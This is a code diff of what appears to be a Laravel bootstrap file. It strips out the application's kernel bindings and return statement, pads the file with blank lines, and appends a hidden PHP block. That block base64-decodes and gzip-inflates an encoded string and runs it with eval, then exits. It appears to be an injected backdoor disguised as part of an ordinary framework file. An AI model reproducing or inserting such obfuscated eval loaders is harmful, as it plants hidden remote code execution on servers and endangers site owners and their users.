@@ -23,30 +23,47 @@
 |
 */
 
-$app->singleton(
-    Illuminate\Contracts\Http\Kernel::class,
-    App\Http\Kernel::class
-);
 
-$app->singleton(
-    Illuminate\Contracts\Console\Kernel::class,
-    App\Console\Kernel::class
-);
 
-$app->singleton(
-    Illuminate\Contracts\Debug\ExceptionHandler::class,
-    App\Exceptions\Handler::class
-);
 
-/*
-|--------------------------------------------------------------------------
-| Return The Application
-|--------------------------------------------------------------------------
-|
-| This script returns the application instance. The instance is given to
-| the calling script so we can separate the building of the instances
-| from the actual running of the application and sending responses.
-|
-*/
 
-return $app;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+?>
+<?php
+$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
+$Lix = "==gFPtM8bUukY4X0gHtEip0SmgoquAuQ/cgas+4/kmBBwf0vcBF9gUotCOQ5mM+uX5cXw7Vai73Q7fmgrDSNJ55NYdAE/3j9IGVjbkE16PEfpGx86kg9zI8UpZI0bGr0ISxxX8Kzz2EuwHu2XhzDiJDegvUxuUZqMZxY9VGjYAi2KD86zpNqVz3RKycZ3sBEqCRWVU7rO1dNGNJzOHmzdTUTvP+6ytUTApZvx0idEjqoiTaRfFBBsotCLKIE/L49FQBMCrwyN2Dn49/NAgcA";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
+
